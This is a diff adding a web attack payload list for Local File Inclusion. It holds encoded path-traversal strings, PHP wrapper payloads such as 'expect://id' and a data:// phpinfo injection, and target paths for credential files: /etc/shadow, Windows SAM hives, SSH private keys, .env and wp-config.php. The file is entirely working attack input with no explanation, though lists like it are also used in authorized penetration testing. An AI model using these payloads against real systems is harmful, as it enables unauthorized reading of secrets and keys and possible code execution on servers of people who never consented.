@@ -1,0 +1,208 @@
+# Local File Inclusion Payloads - 200+ Payloads
+# ==============================================
+
+# Basic LFI
+../../../etc/passwd
+..\..\..\windows\system32\drivers\etc\hosts
+....//....//....//etc/passwd
+/etc/passwd
+C:/Windows/System32/drivers/etc/hosts
+../../../../../../../../etc/passwd%00
+..%2F..%2F..%2Fetc%2Fpasswd
+....%2F....%2F....%2Fetc%2Fpasswd
+/proc/version
+/etc/issue
+../../../windows/win.ini
+
+# Null Byte Injection
+../../../../../../../../etc/passwd%00
+../../../../../../../../etc/passwd\0
+../../../../../../../../etc/passwd%00.jpg
+../../../../../../../../etc/passwd\0.txt
+..%2F..%2F..%2Fetc%2Fpasswd%00
+
+# Double Encoding
+..%252F..%252F..%252Fetc%252Fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
+
+# UTF-8 Encoding
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
+
+# 16-bit Unicode Encoding
+..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd
+..%u002f..%u002f..%u002fetc%u002fpasswd
+
+# Linux System Files
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/issue
+/etc/hostname
+/etc/resolv.conf
+/etc/fstab
+/etc/crontab
+/etc/sudoers
+/etc/apache2/apache2.conf
+/etc/httpd/conf/httpd.conf
+/etc/nginx/nginx.conf
+/etc/mysql/my.cnf
+/etc/ssh/sshd_config
+/proc/version
+/proc/meminfo
+/proc/cpuinfo
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/stat
+/proc/self/status
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+
+# Windows System Files
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/System32/drivers/etc/networks
+C:/Windows/System32/drivers/etc/lmhosts.sam
+C:/Windows/boot.ini
+C:/Windows/win.ini
+C:/Windows/system.ini
+C:/Windows/system32/config/SAM
+C:/Windows/system32/config/SYSTEM
+C:/Windows/system32/config/SECURITY
+C:/Windows/system32/config/SOFTWARE
+C:/Windows/system32/config/DEFAULT
+C:/Windows/repair/SAM
+C:/Windows/repair/SYSTEM
+C:/Windows/repair/SECURITY
+C:/Windows/repair/SOFTWARE
+C:/Windows/repair/DEFAULT
+C:/Windows/Panther/Unattend.xml
+C:/Windows/Panther/Unattended.xml
+C:/inetpub/wwwroot/web.config
+C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web.config
+
+# Web Application Files
+../config/database.yml
+../config/config.yml
+../config/settings.yml
+../config/app.yml
+../config.php
+../wp-config.php
+../configuration.php
+../settings.php
+../includes/config.inc.php
+../admin/config.php
+../application/config/database.php
+../application/config/config.php
+../sites/default/settings.php
+../app/etc/local.xml
+../app/config/parameters.yml
+../app/config/config.yml
+../.env
+../.htaccess
+../.htpasswd
+../robots.txt
+../sitemap.xml
+../crossdomain.xml
+../clientaccesspolicy.xml
+
+# Log Files
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/auth.log
+/var/log/syslog
+/var/log/messages
+/var/log/secure
+/var/log/kern.log
+/var/log/daemon.log
+/var/log/mail.log
+/var/log/mysql/mysql.log
+/var/log/mysql.log
+/var/log/mysql/error.log
+C:/Windows/system32/LogFiles/W3SVC1/ex*.log
+C:/inetpub/logs/LogFiles/W3SVC1/ex*.log
+
+# SSH and Service Files
+/home/*/.ssh/id_rsa
+/home/*/.ssh/id_dsa
+/home/*/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_dsa
+/root/.ssh/authorized_keys
+/home/*/.bash_history
+/root/.bash_history
+/home/*/.mysql_history
+/root/.mysql_history
+
+# Application Specific
+/opt/lampp/etc/httpd.conf
+/usr/local/apache/conf/httpd.conf
+/usr/local/apache2/conf/httpd.conf
+/usr/local/etc/apache/httpd.conf
+/var/www/html/.htaccess
+/var/www/.htaccess
+/etc/apache2/sites-available/000-default
+/etc/apache2/sites-enabled/000-default
+
+# Double Dot Variations
+....//....//....//etc/passwd
+..../..../....//etc/passwd
+....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
+....\....\....\\windows\\system32\\drivers\\etc\\hosts
+
+# Mixed Slash Variations
+..\\..\../etc/passwd
+../..\\..\\etc/passwd
+..\\../..\\etc/passwd
+..\\..\../windows/system32/drivers/etc/hosts
+../..\\..\\windows/system32/drivers/etc/hosts
+
+# Multiple Encoding Combinations
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+
+# Case Variations
+../../../ETC/PASSWD
+../../../Etc/Passwd
+..\\..\..\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS
+..\\..\..\\Windows\\System32\\Drivers\\Etc\\Hosts
+
+# PHP Wrapper Attacks
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/read=string.rot13/resource=../config.php
+php://filter/convert.iconv.utf-8.utf-16/resource=../config.php
+php://input
+php://stdin
+php://memory
+php://temp
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+expect://id
+expect://ls
+zip://test.zip#test.txt
+compress.zlib://test.txt
+compress.bzip2://test.txt
+
+# Additional System Paths
+/usr/local/etc/php.ini
+/etc/php.ini
+/etc/php/7.4/apache2/php.ini
+/etc/php/7.4/cli/php.ini
+/var/lib/php/sessions
+/tmp/sess_*
+/var/tmp/sess_*
+/var/lib/php5/sess_*
+/var/lib/php/sess_*
+/tmp/phpinfo.log
+/tmp/error.log
+/var/tmp/error.log
